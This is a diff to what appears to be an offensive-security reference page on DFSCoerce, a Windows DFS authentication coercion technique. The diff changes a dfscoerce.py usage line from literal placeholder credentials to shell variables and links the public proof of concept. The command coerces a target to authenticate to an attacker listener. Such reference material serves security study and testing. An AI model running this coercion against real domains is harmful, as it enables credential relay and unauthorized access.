@@ -16,7 +16,7 @@ In mid-2022, [Filip Dragovic](https://twitter.com/filip_dragovic) demonstrated t
 The following Python proof-of-concept ([https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)) implements the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` methods.
 
 ```bash
-dfscoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
+dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" LISTENER TARGET
 ```
 
 ## Resources
